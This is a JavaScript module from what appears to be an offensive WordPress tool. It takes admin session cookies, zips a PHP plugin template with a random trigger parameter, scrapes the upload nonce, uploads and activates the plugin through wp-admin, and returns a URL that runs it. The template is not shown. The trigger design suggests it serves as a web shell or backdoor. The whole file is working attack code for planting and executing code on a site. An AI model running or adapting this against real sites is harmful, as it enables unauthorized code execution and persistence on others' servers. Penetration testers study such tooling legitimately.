import { appConfig } from '../config/appConfig.js'
import fs from 'fs'
import * as utils from '../lib/utils.js'
import AdmZip from 'adm-zip'
import fetch from 'node-fetch'
import * as cheerio from 'cheerio'


/**
 * Create zip archive from plugin, the plugin is executed when a specific link is accessed
 *
 * @async
 * @param {string} host
 * @returns {Promise<string>} -Url to trigger plugging execution
 */
async function generatePlugin(host) {
    const filePath = appConfig.app.rootPath + appConfig.app.pluginFilePath
    // Get plugin template
    if (!fs.existsSync(filePath)) {
        throw new Error(`Could not generate plugin, cannot find ${ filePath }`)
    }

    let plugin = await utils.readFile(filePath)
    // Insert random string into plugin code
    const param = utils.randomString(25)
    const chars = { '{{randomString}}': param }
    let updatedPlugin = utils.strReplace(plugin, chars)

    // Zip plugin
    const zip = new AdmZip()
    const archivePath = appConfig.app.rootPath + appConfig.app.archivePath
    zip.addFile('wp-plugin.php', Buffer.from(updatedPlugin), "utf8")
    zip.writeZip(archivePath, (err) => {
        if (err !== null) {
            throw new Error(`Could not generate plugin archive at: ${ archivePath }`)
        }
    })

    return `${ host }/?${ param }`
}

/**
 * Upload plugin and get activation link
 *
 * @async
 * @param {string} host
 * @param {string} cookies - Session cookies
 * @returns {Promise<Object.<activatePluginLink: string, cookies: string, pluginName: string>>}
 */
async function uploadPlugin(host, cookies) {
    // TODO - Should check if a plugin with the same name already exists and clean it
    const pluginName = 'my-plugin'

    const getPluginRes = await fetch(host + '/wp-admin/plugin-install.php', {
        headers: { 'Cookie': cookies }
    })
    // Extract wpNonce
    const html = await getPluginRes.text()
    const $ = cheerio.load(html)
    const wpNonce = $('#_wpnonce').attr('value')

    // Upload plugin
    const endpoint = '/wp-admin/update.php?action=upload-plugin'
    const archivePath = appConfig.app.rootPath + appConfig.app.archivePath
    const body = new FormData()
    const blob = new Blob([fs.readFileSync(archivePath)], { type: 'application/zip-compressed' })

    body.set('_wpnonce', wpNonce)
    body.set('_wp_http_referer', '/wp-admin/plugin-install.php')
    body.set('pluginzip', blob, 'wp-plugin.zip')
    body.set('install-plugin-submit', 'Install Now')

    const postPluginResponse = await fetch(host + endpoint, {
        method: 'POST',
        headers: {
            'Cookie': cookies,
            'Referer': `${ host }/wp-admin/plugin-install.php`
        },
        body
    })
    const text = await postPluginResponse.text()
    const $_postPluginResponse = await cheerio.load(text)

    if (!postPluginResponse.ok) {
        console.error(`${ utils.printCheck.failure() } Could not upload plugin, user probably does not have the right`)
        throw new Error("\n > " + "\"" + $_postPluginResponse('.wp-die-message').text() + "\"")
    }

    // Get activate plugin info
    const activatePluginLink = $_postPluginResponse('.button').attr('href')

    if (!activatePluginLink.includes('plugins.php?action=activate')) {
        const errorMessage = `Could not find data to activate plugin: ${ utils.textColoring(pluginName, 'yellow') }`
        console.error(`${ utils.printCheck.failure() } ${ errorMessage }`)

        throw new Error(errorMessage)
    }

    return { activatePluginLink, cookies, pluginName }
}

/**
 * Enable uploaded plugin on WordPress
 *
 * @async
 * @param {string} host
 * @param {string} activatePluginLink
 * @param {string} cookies
 * @param {string} pluginName
 * @returns {Promise<void>}
 */
async function enablePlugin(host, activatePluginLink, cookies, pluginName) {
    const activatePlugin = await fetch(`${ host }/wp-admin/${ activatePluginLink }`, {
        headers: { 'Cookie': cookies }
    })
    const activatePluginResText = await activatePlugin.text()
    const $_activatePluginResText = await cheerio.load(activatePluginResText)

    if ($_activatePluginResText(`[data-slug="${ pluginName }"]`).length === 0) {
        throw new Error(`Plugin activation failed.`)
    }
}


export { generatePlugin, uploadPlugin, enablePlugin }
